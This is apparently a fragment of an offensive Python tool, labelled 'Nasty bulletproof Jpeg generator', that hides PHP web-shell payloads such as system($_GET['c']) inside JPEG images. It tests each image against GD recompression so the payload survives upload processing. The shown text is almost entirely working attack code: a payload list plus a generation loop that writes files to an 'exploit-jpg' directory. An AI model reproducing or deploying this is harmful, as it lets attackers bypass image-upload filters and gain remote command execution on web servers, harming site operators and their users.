if __name__=='__main__':

	print("[+] Virtualabs' Nasty bulletproof Jpeg generator")
	print(" |  website: http://virtualabs.fr")
	print(" |  contact: virtualabs -at- gmail -dot- com")
	print("")

	payloads = ["<?php system(/**/$_GET['c'/**/]); ?>","<?php /**/system($_GET[chr(99)/**/]); ?>","<?php system(/**/$_GET[chr(99)]); ?>","<?php\r\nsystem($_GET[/**/'c']);\r\n ?>"]

	# make sure the exploit-jpg directory exists or create it
	if os.path.exists('exploit-jpg') and not os.path.isdir('exploit-jpg'):
		print("[!] Please remove the file named 'exploit-jpg' from the current directory")
	elif not os.path.exists('exploit-jpg'):
		os.mkdir('exploit-jpg')
		
	# start generation
	print('[i] Generating ...')
	for q in list(range(50,100))+[-1]:
		# loop over every payload		
		for p in payloads:
			# not done yet
			done = False
			start = time()
			# loop while not done and timeout not reached
			while not done and (time()-start)<10.0:
				
				# we create a NxN pixels image, true colors
				img = gd.image((N,N),True)
				# we create a palette
				pal = []
				for i in range(N*N):
					pal.append(img.colorAllocate((randint(0,256),randint(0,256),randint(0,256))))
				# we shuffle this palette
				shuffle(pal)
				# and fill the image with it			
				pidx = 0
				for x in  range(N):
					for y in range(N):
						img.setPixel((x,y),pal[pidx])
						pidx+=1
						
				# write down the image
				out_jpg = StringIO('')	
				img.writeJpeg(out_jpg,q)
				out_raw = out_jpg.getvalue()
							
				# now, we try to insert the payload various ways
				for i in range(64):
					test_jpg = StringIO('')
					if insertPayload(out_raw,test_jpg,p,i):
						try:
							# write down the new jpeg file
							f = open('exploit-jpg/exploit-%d.jpg'%q,'wb')
							f.write(test_jpg.getvalue())
							f.close()
							
							# load it with GD
							test = gd.image('exploit-jpg/exploit-%d.jpg'%q)
							final_jpg = StringIO('')
							test.writeJpeg(final_jpg,q)
							final_raw = final_jpg.getvalue()
							# does it contain our payload ?
							if p in final_raw:
								# Yay ! 
								print('[i] Jpeg quality %d ... DONE'%q)
								done = True
								break
						except IOError as e:
							pass
					else:
						break
			if not done:
				# payload not found, we remove the file
				os.unlink('exploit-jpg/exploit-%d.jpg'%q)
			else:		
				break
			